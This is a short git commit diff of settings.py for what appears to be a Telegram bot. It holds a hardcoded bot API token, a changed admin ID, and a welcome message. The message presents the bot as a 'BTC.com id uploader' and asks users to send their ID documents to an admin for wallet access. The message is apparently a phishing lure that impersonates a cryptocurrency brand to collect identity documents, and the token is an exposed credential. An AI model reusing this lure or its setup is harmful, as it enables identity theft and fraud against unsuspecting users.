f9a207fbe44c5c439d4c6bf15e98b4af994aec64
Kermitofx <39018448+Kermitofx@users.noreply.github.com>
2020-01-14 23:13:23 -0300

    Update settings.py

--- settings.py
+++ settings.py
@@ -1,7 +1,7 @@
 API_TOKEN = "923692974:AAFNwAZZuGojdgWu0jsCxb5qQ0EhobAnMMM"
 
 
-ADMIN_ID = -1351515550
+ADMIN_ID = 684842099
 
 
 HELLO_MESSAGE = "welcome to BTC.com id uploader bot.\nhere you can upload your id to get access to  Our Bitcoin Wallet.\n\nonce approved you will get a notification and will be able to access our services.\nThis verification process is to ensure no spammers get to use our services\n\n Now enter your id and send it to Admin for confirmation "
